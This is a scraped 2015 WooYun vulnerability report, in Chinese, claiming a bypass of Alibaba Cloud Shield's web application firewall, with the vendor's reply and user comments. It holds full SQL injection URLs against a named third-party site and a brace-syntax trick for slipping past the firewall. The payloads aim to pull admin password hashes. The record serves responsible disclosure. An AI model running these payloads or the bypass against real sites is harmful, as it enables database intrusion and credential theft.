{"id": 18978, "wybug_id": "wooyun-2015-0116208", "wybug_title": "阿里巴巴云盾防御策略可以bypass（实例证明）", "wybug_corp": "阿里巴巴", "wybug_author": "izy", "wybug_date": "2015-05-26 10:45", "wybug_open_date": "2015-07-10 17:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向公众公开  简要描述： 实例证明，求不忽略！ 详细说明：  别人给的一个测试网站：http://www.fywealth.cn/首先访问这个exp，在aid=1555时添加评论，insert类型的注入：\nhttp://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1555','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',user())%23\n我们可以看到当aid=1555能注入出用户，说明确实有注入！\n\n现在我们看看能不能select出密码：http://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1532','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1))%23发现被拦截\n\n然后我们fuzz发现from和select的单词边界被拦截，所以构造(select(select{x pwd}from{x %23@__admin}+limit+1))访问：http://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select{x pwd}from{x %23@__admin}+limit+1)))%23可以看到成功绕过了waf,发送到服务端（从报错语句就能看出来确实是绕过了waf发送到了服务器的），但是貌似mysql版本过低（5.0.x），所以出现了mysql报错，如果mysql不是低版本的话是可以select出来密码的。\n\n找到此服务器的mysql版本为5.0.22，本地搭建5.0.22的mysql测试,此类型的会报错！\n\n但是5.5的就可以，其他的就不测试了~\n\n让我们看看这条语句是否真的发送到了服务器端，如果发送到了mysql报错会显示出来，如果没发送到服务端mysql报错将不显示我们的语句。我们在关键语句前加update让它报错http://www.fywealth.cn/plus/feedback.php?validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0','x' update (select(select{x pwd}from{x %23@__admin}+limit+1)))%23\n\n现在可以确认了是完全绕过了waf吧！可以确认此语句是发送到了服务器的，接下来我们只要证明这种类型的语句可以执行达到注入攻击的目的就ok了！可能还会有人认为这个密码还是没有select出来不能让大家信服，因为没有好的环境测试，所以我们本地测试此语句。构造一个差不多的语句如下：\ninsert into users (user_id,first_name) values(18,(select(select{x name}from{x guestbook}limit 1)))#test\n这是可以成功执行的\n\n上面的只是证明了bypass了waf的一种sql注入，但是这种查询方式还能运用到到其他注入攻击利用select{x pwd}from{x %23@admin}limit 1) 还可以进行报错注入等....无奈此环境也没有报错注入函数去实验，但是已经绕过了waf的拦截，是肯定可以报错注入出来的\nFUNCTION fywealth20120920.updatexml does not exist\n   漏洞证明：  \n\n   修复方案：  你懂得   版权声明：转载请注明来源 izy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-05-26 17:20 厂商回复： 亲，之前已有白帽子上报过同样问题，我们将在近期版本升级中解决这一问题。感谢您对阿里巴巴安全的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-26 17:43 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  以前我报过了但是你们忽略了…    \n     2015-05-26 18:25 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  6666666666    \n     2015-05-26 18:37 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @izy ......    \n     2015-05-26 19:02 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  @xsser 好像多说些什么...T_T    \n     2015-05-26 19:05 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @xsser @izy  你说的太多了， WooYun: 阿里巴巴云盾防御策略可以bypass 是这个吧    \n     2015-05-26 21:41 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  哈哈    \n     2015-05-27 10:41 |    \t\t晶晶妹 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 安全宝代言人)\t\t \n  额。。。    \n     2015-08-16 15:49 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  吊吊吊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}